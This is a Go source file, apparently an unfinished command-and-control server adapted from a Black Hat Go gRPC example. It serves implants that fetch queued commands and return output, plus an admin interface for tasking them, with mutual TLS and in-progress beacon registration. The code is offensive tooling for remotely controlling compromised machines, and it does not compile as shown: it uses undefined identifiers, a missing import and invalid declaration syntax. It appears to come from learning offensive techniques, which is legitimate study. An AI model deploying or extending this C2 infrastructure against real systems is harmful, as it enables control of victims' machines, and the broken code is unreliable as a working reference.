package main

import (
        "context"
        "crypto/tls"
        "crypto/x509"
        "fmt"
        "io/ioutil"
        "log"
        "errors"
        "net"

	"github.com/blackhat-go/bhg/ch-14/grpcapi"
        "google.golang.org/grpc"
        "google.golang.org/grpc/credentials"
	"google.golang.org/grpc/metadata"

)

type implantServer struct {
        work, output chan *grpcapi.Command
}

type adminServer struct {
        work, output chan *grpcapi.Command // we're adding adminCommands here to this type. These will be server specific and don't get sent to beacons
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	// I think we should add the implant checkin here
        s := new(implantServer)
        s.work = work
        s.output = output
        return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
        s := new(adminServer)
        s.work = work
        s.output = output

        return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
        var cmd = new(grpcapi.Command)
        select {
        case cmd, ok := <-s.work:
                if ok {
                        return cmd, nil
                }
                return cmd, errors.New("channel closed")
        default:
                // No work
                return cmd, nil
        }
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) { // using s in the func name to use the type defined above (s *implantServer)
        s.output <- result
        return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
        var res *grpcapi.Command
		// if cmd.startsWith('1') then s.work <- cmd else s.adminCommands <- cmd
		// but right now we can't use a strings method because cmd isn't a string and we can't recast it....
		// case listClients, case removeClient, etc...
		// maybe we have to cast cmd to s.adminCommand and check it outside of here before giving it to s.work?
		go func() { // this function takes in the command and sends it to the work queue, we should add some logic here to check if it's an admin command or an implant command
			s.work <- cmd // this is the worker queue, we added adminCommands up top
		}()
		res = <-s.output
		return res, nil

}

func (s *implantServer) RegisterClient(ctx context.Context) (string, error) {
	if md, ok := metadata.FromIncomingContext(ctx); ok {
		clientName := strings.Join(md["name"], "")
		log.Printf("New beacon: %s", clientName)
		return "200 ",nil
	}
	return "", fmt.Errorf("missing name")
}

func unaryInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
	s, ok := info.Server.(*api.Server)
	if !ok {
		return nil, fmt.Errorf("unable to cast server")
	}
	clientID, err := authenticateClient(ctx, s)
	if err != nil {
		return nil, err
	}
	ctx = context.WithValue(ctx, clientIDKey, clientID)
	return handler(ctx, req)
}

func main() {
        var (
                implantListener, adminListener net.Listener
                err                            error
                opts                           []grpc.ServerOption{grpc.unaryInterceptor(unaryInterceptor)}
                work, output				   chan *grpcapi.Command
        )

		certificate, err := tls.LoadX509KeyPair(
	"/etc/server/certs/server.crt",
	"/etc/server/certs/server.key",
	)

	certPool := x509.NewCertPool()
	bs, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
	if err != nil {
		log.Fatalf("failed to read client ca cert: %s", err)
	}

	ok := certPool.AppendCertsFromPEM(bs)
	if !ok {
		log.Fatal("failed to append client certs")
	}

	tlsConfig := &tls.Config{
		ClientAuth:   tls.RequireAndVerifyClientCert,
		Certificates: []tls.Certificate{certificate},
		ClientCAs:    certPool,
	}

        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
        implant := NewImplantServer(work, output)
        admin := NewAdminServer(work, output)
        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
                log.Fatal(err)
        }
        if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
                log.Fatal(err)
        }

        serverOption := grpc.Creds(credentials.NewTLS(tlsConfig))

        grpcImplantServer := grpc.NewServer(serverOption)
        grpcAdminServer := grpc.NewServer(opts...)
        grpcapi.RegisterImplantServer(grpcImplantServer, implant)
        grpcapi.RegisterAdminServer(grpcAdminServer, admin)

        go func() {
                grpcImplantServer.Serve(implantListener)
        }()
        grpcAdminServer.Serve(adminListener)
}
